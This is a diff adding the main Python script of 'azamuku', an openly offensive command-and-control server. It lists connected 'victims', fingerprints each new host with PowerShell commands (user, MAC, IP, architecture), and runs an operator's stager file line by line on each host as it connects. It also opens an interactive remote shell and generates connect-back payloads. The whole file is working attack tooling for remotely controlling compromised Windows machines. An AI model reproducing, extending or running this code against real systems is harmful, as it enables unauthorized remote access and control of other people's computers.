@@ -1,0 +1,278 @@
+#!/usr/bin/python3
+import core.server as s
+from prettytable import PrettyTable
+import time
+import threading
+import argparse
+import os
+
+"""
+written by otter - github.com/whatotter
+"""
+
+stager = None
+
+def getInfo():
+    global stager
+    old = 0
+
+    while True:
+        if len(s.connects) != old:
+            newUID = s.connects[-1]
+            control = s.client(newUID)
+
+            s.vicInfo[newUID] = {
+                "hostname": control.run("whoami"),
+                "mac": control.run("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress").replace("-", ":"),
+                "ip": control.run("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress"),
+                "arch": "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64",
+            }
+
+            if stager == None:
+                pass
+            else:
+                try:
+                    for x in open(stager, "r").read().split("\n"):
+                        control.run(x)
+                except Exception as e:
+                    print("\n[+] failed to run stager on uid '{}' - '{}'".format(x, e))
+
+            old = len(s.connects)
+
+        else:
+            time.sleep(0.1)    
+
+def coolFade(text, start, end):
+    """
+    cool text fade thingymabob
+    """
+
+    os.system("")
+
+    def getValidValue(color):
+        """fix the value and return it (if its >255, put 255 instead)"""
+        if color > 255: return 255
+        elif color < 0: return 0
+        else: return color
+
+    coloredLines = []
+    # math
+    lines = text.split("\n")
+
+    r, g, b = start
+
+    r1, g1, b1 = start
+    r2, g2, b2 = end
+
+    rInterval = round((r1 - r2) / len(lines)) * -1
+    gInterval = round((g1 - g2) / len(lines)) * -1
+    bInterval = round((b1 - b2) / len(lines)) * -1
+
+    for x in lines:
+        r = getValidValue(r + rInterval)
+        g = getValidValue(g + gInterval)
+        b = getValidValue(b + bInterval)
+
+        coloredLines.append("\033[38;2;{};{};{}m{}\033[0m".format((r), (g), (b), x))
+
+    return '\n'.join(coloredLines) + "\033[0m"
+
+def highlight(text:str, highlight:list, color=(0, 255, 0)):
+    for x in highlight:
+        highlightText = "\033[38;2;{};{};{}m{}\033[0m".format(color[0], color[1], color[2], x)
+        text = text.replace(x, highlightText)
+    return text
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("-s",
+                        "--server",
+                        help="ip to bind the http(s) server to (default: 0.0.0.0)",
+                        default="0.0.0.0")
+    
+    parser.add_argument("--http-port",
+                        help="port to bind the http server to (default: 8080)",
+                        default="8080")
+    
+    parser.add_argument("--https-port",
+                        help="port to bind the https server to (default: 8081)",
+                        default="8081")
+    
+    parser.add_argument("--certfile",
+                        help="certfile for the https server (https://stackoverflow.com/a/10176685) (default: server.pem)",
+                        default="server.pem")
+    
+    parser.add_argument("--keyfile",
+                        help="keyfile for the https server (https://stackoverflow.com/a/10176685) (default: key.pem)",
+                        default="key.pem")
+    
+    parser.add_argument("--stager",
+                        help="a stager text file that executes commands from a text file, line by line (default: None)",
+                        default=None)
+    
+    args = parser.parse_args()
+    stager = args.stager
+    srv = s.azamuku()
+
+    if not os.path.exists(args.certfile):
+        a = input("[X] certificate \"{}\" not found - would you like to create one? (also creates keyfile) (requires openssl) [y/n]".format(args.certfile)).lower()
+        if a == "y":
+            os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
+            print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
+            args.certfile = 'server.pem'; args.keyfile = 'key.pem'
+        else:
+            print('[X] no certificate found, and user declined - skipping HTTPS server..')
+            args.https_port = 0
+
+    elif not os.path.exists(args.keyfile):
+        a = input("[X] keyfile \"{}\" not found - would you like to create one? (also creates certificate) (requires openssl) [y/n]".format(args.keyfile)).lower()
+        if a == "y":
+            os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
+            print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
+            args.certfile = 'server.pem'; args.keyfile = 'key.pem'
+        else:
+            print('[X] no keyfile found, and user declined - skipping HTTPS server..')
+            args.https_port = 0
+
+    srv.start(args.server, httpPort=int(args.http_port), httpsPort=int(args.https_port), certfile=args.certfile)
+    threading.Thread(target=getInfo, daemon=True).start()
+
+    # cant be pro hacker if there isn't cool banner
+    print(coolFade("""
+                                     _          
+                                    | |         
+       __ _ ______ _ _ __ ___  _   _| | ___   _ 
+      / _` |_  / _` | '_ ` _ \| | | | |/ / | | |
+     | (_| |/ / (_| | | | | | | |_| |   <| |_| |
+      \__,_/___\__,_|_| |_| |_|\__,_|_|\_\\\\__,_|
+                   """, (200, 0, 0), (75, 0, 0)))
+    
+    # can't be pro hacker if you don't have some random quote
+    print("\"fool me once, shame on you - fool me twice, shame on me\"")
+    print("       created by otter - github.com/whatotter\n")
+    
+    if args.http_port != 0: print("[+] started azamuku's HTTP server @ {}:{}".format(args.server, args.http_port))
+    if args.https_port != 0: print("[+] started azamuku's HTTPS server @ {}:{}".format(args.server, args.https_port))
+    print("[+] run 'help' for a list of commands - good luck :)")
+    print("") # \n
+
+    while True:
+
+        try:
+            inp = input("[" + coolFade("azamuku", (125,0,0), (125,0,0)).strip() +"]> ")
+            cmd = inp.split(" ")[0]
+            try:
+                cArgs = inp.split(" ", 1)[-1]
+            except:
+                cArgs = None
+
+        except KeyboardInterrupt:
+            if input("\n\n[+] are you sure you want to exit? this will kill all sessions, and break all shells [y/n]").lower() == "y":
+                break
+            else:
+                continue
+        except:
+            continue
+
+        print("") #\n
+
+        if cmd.lower() == "info":
+            if len(list(s.vicInfo)) == 0:
+                print("no victims")
+                continue
+            else:
+                first = list(s.vicInfo)[0] # is a uid
+                t = PrettyTable(["uid"] + list(s.vicInfo[first]))
+                for uid in s.vicInfo:
+                    t.add_row([uid] + [s.vicInfo[uid][x] for x in s.vicInfo[uid]])
+
+                print(t)
+
+        elif cmd.lower() == "shell": # interactive shell
+            uid = cArgs.split(" ", 1)[0]
+            if uid in s.connects:
+                print("[+] pop thy shell")
+                victim = s.client(uid)
+                pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
+
+                while True:
+                    try:
+                        command = input(pwd)
+                        if command in ["quit", "exit"]:
+                            break
+                        elif command in ["cd"]:
+                            pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
+                    except KeyboardInterrupt:
+                        print('\n\n[+] breaking out of shell due to ctrl+c\n')
+                        break
+                    
+                    try:
+                        print(coolFade(victim.run(command), (150, 150, 150), (150, 150, 150)))
+                    except:
+                        print("[+] killed due to ctrl+c")
+            else:
+                print("[X] uid '{}' not valid - run command 'info' for a list of victims".format(uid))
+
+        elif cmd.lower() == "payload":
+            ip, port = cArgs.split(" ", 1)
+            payload = s.payload.generatePayload(ip, port, "http.txt")
+            print(highlight(payload, [ip, port], color=(150, 0, 0)))
+
+        elif cmd.lower() == "allow":
+            if cArgs in os.listdir(os.path.dirname(cArgs)):
+                uids = open(cArgs, "r").read().split("\n")
+                for x in uids:
+                    s.authorized.append(cArgs)
+                print("[+] allowed {} uids to connect back, from file '{}'".format(len(uids), cArgs))
+
+            s.authorized.append(cArgs)
+            print('[+] allowed uid \'{}\' to connect back'.format(cArgs))
+
+        elif cmd.lower() == "grab":
+            if s.enableGrab == False:
+                print("[+] this allows *unauthenticated* payloads to be re-authenticated - if you have the old payload, it's better to reauthenticate the uid using the 'allow' command - are you sure you want to enable this?", end="")
+                if input("[y/n]").lower() == "y":
+                    s.enableGrab = True
+                    print("[+] enabled grabbing old sessions - toggle this by running 'grab' again")
+            else:
+                s.enableGrab = False
+                print("[+] disabled grabbing")
+
+        elif cmd.lower() == "export":
+            with open(cArgs, "w") as f:
+                f.write('\n'.join(s.authorized))
+                f.flush()
+            print("[+] exported {} uids to '{}' - use 'allow {}' to use them later, on this same server".format(len(s.authorized), cArgs, cArgs))
+
+        elif cmd.lower() in ["help", "?", ""]:
+            commands = {
+                "info": ["shows all victims connected to this azamuku instance, plus info", "info"],
+                "shell": ["runs an interactive shell on a specific uid", "shell (uid)"],
+                "payload": ["generates a payload, with a random, authorized uid", "payload (ip) (port)"],
+                "allow": ["authorizes a uid, or a file of uids - ex: from an old payload", "allow (uid, file)"],
+                "grab": ["allows grabbing unauthorized uids connecting back to this server", "grab"],
+                "export": ["exports authorized uids for later use with allow", "export (file)"],
+                "exit": ["i wonder what this one does", "exit"],
+                "quit": ["synonymous to exit", "quit"]
+            }
+
+            t = PrettyTable(["command", "description", "usage"])
+            t.align = "l"
+            for k, v in commands.items():
+                t.add_row([k, v[0], v[1]])
+
+            print(t)
+
+        elif cmd.lower() in ["quit", "exit"]:
+            if input("[+] are you sure you want to exit? this will kill all sessions, and break all shells [y/n]").lower() == "y":
+                break
+            else:
+                continue
+
+        else:
+            print("[+] not a valid command - run 'help' for a table of them")
+
+        print("") #\n
+
+    srv.stop()
